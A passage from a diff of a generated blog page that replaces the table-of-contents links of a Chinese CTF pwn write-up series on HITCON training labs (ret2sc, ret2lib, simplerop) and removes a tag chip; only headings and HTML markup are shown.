-                    
-                    <a href="/tags/RE/" target="_blank">
-                        <span class="chip bg-color">RE</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
     </div>
 </article>
 </div>
@@ -808,7 +797,7 @@ emmm记录一下实验吧里一道简单的逆向，实际上就是一种思维�
         <div class="toc-widget">
             <h4>目录</h4>
             <div id="toc-content">
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-10月23-Hitcon-一"><span class="post-toc-text">Pwn-10月23-Hitcon(一)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab1-sysmagic"><span class="post-toc-text">lab1-sysmagic</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#解法1-patch"><span class="post-toc-text">解法1 - patch</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#解法2-gdb-set-register-value"><span class="post-toc-text">解法2 - gdb set register value</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab2-orw"><span class="post-toc-text">lab2-orw</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检查保护措施"><span class="post-toc-text">检查保护措施</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#逻辑分析"><span class="post-toc-text">逻辑分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab3-ret2sc"><span class="post-toc-text">lab3-ret2sc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检查保护措施-1"><span class="post-toc-text">检查保护措施</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#逻辑分析-1"><span class="post-toc-text">逻辑分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#构造EXP"><span class="post-toc-text">构造EXP</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#小结"><span class="post-toc-text">小结</span></a></li></ol></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-10月24-hitcon-二"><span class="post-toc-text">Pwn-10月24-hitcon(二)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab4-ret2lib"><span class="post-toc-text">lab4 - ret2lib</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检查保护措施"><span class="post-toc-text">检查保护措施</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#逻辑分析"><span class="post-toc-text">逻辑分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#构造exp"><span class="post-toc-text">构造exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab5-simplerop"><span class="post-toc-text">lab5-simplerop</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检查保护措施-1"><span class="post-toc-text">检查保护措施</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#逻辑分析-1"><span class="post-toc-text">逻辑分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#构造exp-1"><span class="post-toc-text">构造exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#小结"><span class="post-toc-text">小结</span></a></li></ol></li></ol>
             </div>
         </div>
     </div>
